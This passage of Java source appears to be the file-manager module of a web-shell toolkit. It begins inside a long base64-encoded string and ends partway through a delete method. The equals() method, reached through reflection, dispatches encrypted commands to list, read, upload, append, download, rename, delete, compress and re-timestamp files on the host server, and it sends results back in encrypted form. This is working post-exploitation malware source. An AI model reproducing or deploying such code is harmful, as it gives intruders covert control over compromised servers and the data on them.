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";
        this.osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
    }

    public boolean equals(Object obj) {
        Map<String, String> result = new HashMap();
        try {
            try {
                fillContext(obj);
                if (mode.equalsIgnoreCase("list")) {
                    result.put("msg", list());
                    result.put("status", "success");
                } else if (mode.equalsIgnoreCase("show")) {
                    result.put("msg", show());
                    result.put("status", "success");
                } else if (mode.equalsIgnoreCase("checkExist")) {
                    result.put("msg", checkExist(path));
                    result.put("status", "success");
                } else if (mode.equalsIgnoreCase("delete")) {
                    result = delete();
                } else if (mode.equalsIgnoreCase("create")) {
                    result.put("msg", create());
                    result.put("status", "success");
                } else if (mode.equalsIgnoreCase("append")) {
                    result.put("msg", append());
                    result.put("status", "success");
                } else if (mode.equalsIgnoreCase("update")) {
                    updateFile();
                    result.put("msg", "ok");
                    result.put("status", "success");
                } else if (mode.equalsIgnoreCase("downloadPart")) {
                    result.put("msg", downloadPart(path, Long.parseLong(blockIndex), Long.parseLong(blockSize)));
                    result.put("status", "success");
                } else {
                    if (mode.equalsIgnoreCase("download")) {
                        download();
                        try {
                            Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                            Method write = so.getClass().getMethod("write", byte[].class);
                            write.invoke(so, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                            so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                            so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                        return true;
                    }
                    if (mode.equalsIgnoreCase("rename")) {
                        result = renameFile();
                    } else if (mode.equalsIgnoreCase("createFile")) {
                        result.put("msg", createFile());
                        result.put("status", "success");
                    } else if (mode.equalsIgnoreCase("compress")) {
                        zipFile(path, true);
                        result.put("msg", "ok");
                        result.put("status", "success");
                    } else if (mode.equalsIgnoreCase("createDirectory")) {
                        result.put("msg", createDirectory());
                        result.put("status", "success");
                    } else if (mode.equalsIgnoreCase("getTimeStamp")) {
                        result.put("msg", getTimeStamp());
                        result.put("status", "success");
                    } else if (mode.equalsIgnoreCase("updateTimeStamp")) {
                        result.put("msg", updateTimeStamp());
                        result.put("status", "success");
                    } else if (mode.equalsIgnoreCase("check")) {
                        result.put("msg", checkFileHash(path));
                        result.put("status", "success");
                    }
                }
                try {
                    Object so2 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    Method write2 = so2.getClass().getMethod("write", byte[].class);
                    write2.invoke(so2, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                    so2.getClass().getMethod("flush", new Class[0]).invoke(so2, new Object[0]);
                    so2.getClass().getMethod("close", new Class[0]).invoke(so2, new Object[0]);
                    return true;
                } catch (Exception e2) {
                    e2.printStackTrace();
                    return true;
                }
            } catch (Throwable e3) {
                e3.printStackTrace();
                result.put("msg", e3.getMessage());
                result.put("status", "fail");
                try {
                    Object so3 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    Method write3 = so3.getClass().getMethod("write", byte[].class);
                    write3.invoke(so3, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                    so3.getClass().getMethod("flush", new Class[0]).invoke(so3, new Object[0]);
                    so3.getClass().getMethod("close", new Class[0]).invoke(so3, new Object[0]);
                    return true;
                } catch (Exception e4) {
                    e4.printStackTrace();
                    return true;
                }
            }
        } catch (Throwable th) {
            try {
                Object so4 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                Method write4 = so4.getClass().getMethod("write", byte[].class);
                write4.invoke(so4, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                so4.getClass().getMethod("flush", new Class[0]).invoke(so4, new Object[0]);
                so4.getClass().getMethod("close", new Class[0]).invoke(so4, new Object[0]);
            } catch (Exception e5) {
                e5.printStackTrace();
            }
            throw th;
        }
    }

    private String checkFileHash(String path2) throws Exception {
        FileChannel ch = (FileChannel) sessionGetAttribute(this.Session, path2);
        if (ch != null && ch.isOpen()) {
            ch.close();
        }
        byte[] input = getFileData(path2);
        if (input == null || input.length == 0) {
            return null;
        }
        MessageDigest md5 = MessageDigest.getInstance("MD5");
        md5.update(input);
        byte[] byteArray = md5.digest();
        StringBuilder sb = new StringBuilder();
        for (byte b : byteArray) {
            sb.append(String.format("%02x", Byte.valueOf(b)));
        }
        return sb.substring(0, 16);
    }

    private void updateFile() throws Exception {
        FileChannel ch = (FileChannel) sessionGetAttribute(this.Session, path);
        if (ch == null) {
            FileOutputStream fos = new FileOutputStream(path);
            ch = fos.getChannel();
            sessionSetAttribute(this.Session, "fos", fos);
            sessionSetAttribute(this.Session, path, ch);
        }
        synchronized (ch) {
            ch.position(Integer.parseInt(blockIndex) * Integer.parseInt(blockSize));
            ch.write(ByteBuffer.wrap(base64decode(content)));
        }
    }

    private Map<String, String> warpFileObj(File file) {
        Map<String, String> obj = new HashMap<>();
        obj.put("type", file.isDirectory() ? "directory" : "file");
        obj.put("name", file.getName());
        obj.put("size", file.length() + "");
        obj.put("perm", getFilePerm(file));
        obj.put("lastModified", new SimpleDateFormat("yyyy/MM/dd HH:mm:ss").format(new Date(file.lastModified())));
        return obj;
    }

    private boolean isOldJava() {
        String version = System.getProperty("java.version");
        if (version.compareTo("1.7") >= 0) {
            return false;
        }
        return true;
    }

    private String checkExist(String path2) throws Exception {
        File file = new File(path2);
        if (file.exists()) {
            return file.length() + "";
        }
        throw new Exception("");
    }

    private String getFilePerm(File file) {
        String permStr = "";
        if (isWindows()) {
            try {
                permStr = (file.canRead() ? "R" : "-") + "/" + (file.canWrite() ? "W" : "-") + "/" + (file.canExecute() ? "E" : "-");
            } catch (Error e) {
                permStr = (file.canRead() ? "R" : "-") + "/" + (file.canWrite() ? "W" : "-") + "/-";
            }
        } else {
            String version = System.getProperty("java.version");
            if (version.compareTo("1.7") >= 0) {
                try {
                    getClass();
                    Class<?> cls = Class.forName("java.nio.file.Files");
                    getClass();
                    Class<?> cls2 = Class.forName("java.nio.file.attribute.PosixFileAttributes");
                    getClass();
                    Class<?> cls3 = Class.forName("java.nio.file.Paths");
                    getClass();
                    Class<?> cls4 = Class.forName("java.nio.file.attribute.PosixFilePermissions");
                    Object f = cls3.getMethod("get", String.class, String[].class).invoke(cls3.getClass(), file.getAbsolutePath(), new String[0]);
                    Object attrs = cls.getMethod("readAttributes", Path.class, Class.class, LinkOption[].class).invoke(cls, f, cls2, new LinkOption[0]);
                    Object result = cls4.getMethod("toString", Set.class).invoke(cls4, cls2.getMethod("permissions", new Class[0]).invoke(attrs, new Object[0]));
                    permStr = result.toString();
                } catch (Exception e2) {
                }
            } else {
                permStr = (file.canRead() ? "R" : "-") + "/" + (file.canWrite() ? "W" : "-") + "/" + (file.canExecute() ? "E" : "-");
            }
        }
        return permStr;
    }

    private String list() throws Exception {
        File f = new File(path);
        List<Map<String, String>> objArr = new ArrayList<>();
        objArr.add(warpFileObj(new File(".")));
        objArr.add(warpFileObj(new File("..")));
        if (f.isDirectory() && f.listFiles() != null) {
            for (File temp : f.listFiles()) {
                objArr.add(warpFileObj(temp));
            }
        }
        String result = buildJsonArray(objArr, true);
        return result;
    }

    private String show() throws Exception {
        byte[] fileContent = getFileData(path);
        return base64encode(fileContent);
    }

    private byte[] getFileData(String path2) throws IOException {
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        FileInputStream fis = new FileInputStream(new File(path2));
        while (true) {
            int data = fis.read();
            if (data != -1) {
                output.write(data);
            } else {
                fis.close();
                return output.toByteArray();
            }
        }
    }

    private String create() throws Exception {
        FileOutputStream fso = new FileOutputStream(path);
        fso.write(base64decode(content));
        fso.flush();
        fso.close();
        String result = path + "上传完成，远程文件大小:" + new File(path).length();
        return result;
    }

    private Map<String, String> renameFile() throws Exception {
        Map<String, String> result = new HashMap<>();
        File oldFile = new File(path);
        File newFile = new File(newPath);
        if (oldFile.exists() && (oldFile.isFile() & oldFile.renameTo(newFile))) {
            result.put("status", "success");
            result.put("msg", "重命名完成:" + newPath);
        } else {
            result.put("status", "fail");
            result.put("msg", "重命名失败:" + newPath);
        }
        return result;
    }

    private String createFile() throws Exception {
        FileOutputStream fso = new FileOutputStream(path);
        fso.close();
        String result = path + "创建完成";
        return result;
    }

    private String createDirectory() throws Exception {
        File dir = new File(path);
        dir.mkdirs();
        String result = path + "创建完成";
        return result;
    }

    private void download() throws Exception {
        FileInputStream fis = new FileInputStream(path);
        Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
        Method write = so.getClass().getMethod("write", byte[].class);
        while (true) {
            int data = fis.read();
            if (data != -1) {
                write.invoke(so, Integer.valueOf(data));
            } else {
                so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                fis.close();
                return;
            }
        }
    }

    private String append() throws Exception {
        FileOutputStream fso = new FileOutputStream(path, true);
        fso.write(base64decode(content));
        fso.flush();
        fso.close();
        String result = path + "追加完成，远程文件大小:" + new File(path).length();
        return result;
    }

    private Map<String, String> delete() throws Exception {
        Map<String, String> result = new HashMap<>();
        File f = new File(path);
        if (f.exists()) {
            if (f.delete()) {
                result.put("status", "success");
                result.put("msg", path + " 删除成功.");
            } else {
